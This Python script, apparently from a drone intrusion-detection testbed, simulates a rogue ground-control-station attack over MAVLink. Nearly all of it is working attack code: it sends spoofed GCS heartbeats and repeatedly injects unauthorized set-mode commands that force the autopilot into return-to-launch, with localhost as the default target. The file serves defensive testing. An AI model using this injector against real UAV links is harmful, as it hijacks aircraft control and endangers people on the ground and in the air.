"""
experiments/simulation/attacks/attack_evil_twin.py

Simulates Evil Twin / Rogue Ground Control Station (GCS) Attack:
- Spoofs an unauthorized Ground Control Station by injecting rogue MAVLink heartbeats
  with conflicting System IDs (e.g., sysid=254 claiming GCS authority).
- Injects unauthorized flight control commands (e.g., MAV_CMD_DO_SET_MODE or MAV_CMD_DO_REPOSITION)
  attempting to override the active flight mission.
- Triggers Layer 2 Cyber Protocol Invariant RED ALERT (Evil_Twin Classification).
"""

import os
import sys
import time
import json
import argparse

MARKER_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".active_attack.json"))

def set_attack_marker(attack_name, active=True):
    try:
        with open(MARKER_FILE, "w") as f:
            json.dump({"attack": attack_name if active else "Benign", "active": active, "time": time.time()}, f)
    except Exception:
        pass


def launch_evil_twin_attack(target_ip="127.0.0.1", target_port=14552, duration=15, rate=10, rogue_sysid=254):
    try:
        from pymavlink import mavutil
    except ImportError:
        print("[!] pymavlink not installed. Please run: .venv/bin/pip install pymavlink")
        sys.exit(1)

    print("=" * 70)
    print("ATTACK INJECTION: EVIL TWIN / ROGUE GCS SPOOFING")
    print("=" * 70)
    print(f"[*] Target Destination : udp:{target_ip}:{target_port}")
    print(f"[*] Rogue System ID    : {rogue_sysid} (Claiming GCS authority)")
    print(f"[*] Attack Duration    : {duration} seconds")
    print(f"[*] Injection Rate     : {rate} packets/second")
    print(f"[*] Injection Profile  : Conflicting GCS Heartbeats & Unauthorized Flight Commands")
    print("[*] Expected Response  : Immediate Layer 2 Protocol RED ALERT (Evil_Twin)")
    print("=" * 70)

    # Establish MAVLink sender connection representing rogue GCS
    master = mavutil.mavlink_connection(
        f"udpout:{target_ip}:{target_port}", 
        source_system=rogue_sysid, 
        source_component=190
    )

    set_attack_marker("Evil_Twin", True)
    try:
        start_time = time.time()
        step = 0
        delay = 1.0 / rate if rate > 0 else 0.1
        
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time

            # 1. Send Rogue GCS Heartbeat (MAV_TYPE_GCS = 6)
            master.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_GCS,
                mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED | mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED,
                0,
                mavutil.mavlink.MAV_STATE_ACTIVE
            )

            # 2. Inject Unauthorized Flight Override Command (e.g. MAV_CMD_DO_SET_MODE)
            # Target system 1 (UAV Autopilot), component 1
            master.mav.command_long_send(
                1, 1, # Target sysid 1, compid 1
                mavutil.mavlink.MAV_CMD_DO_SET_MODE,
                0,    # Confirmation
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, # Param 1: Base Mode
                6,    # Param 2: Custom mode (6 = RTL in ArduCopter)
                0, 0, 0, 0, 0
            )

            print(f"[Evil_Twin INJECTING] t={elapsed:4.1f}s | Spoofed GCS sysid={rogue_sysid} | Injected Rogue Heartbeat + Unauthorized RTL Command", end="\r")
            step += 1
            time.sleep(delay)

    finally:
        set_attack_marker("Benign", False)
        print(f"\n\n[+] Evil Twin Attack Injection Complete ({step} packets sent). Link returning to benign state.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Evil Twin / Rogue GCS Spoofing Injector")
    parser.add_argument("--port", type=int, default=14552, help="Target MAVLink detector port")
    parser.add_argument("--duration", type=int, default=15, help="Duration in seconds")
    parser.add_argument("--rate", type=int, default=10, help="Packet injection rate (pkts/s)")
    parser.add_argument("--rogue-sysid", type=int, default=254, help="Spoofed GCS system ID")
    args = parser.parse_args()

    launch_evil_twin_attack(
        target_port=args.port, 
        duration=args.duration, 
        rate=args.rate,
        rogue_sysid=args.rogue_sysid
    )
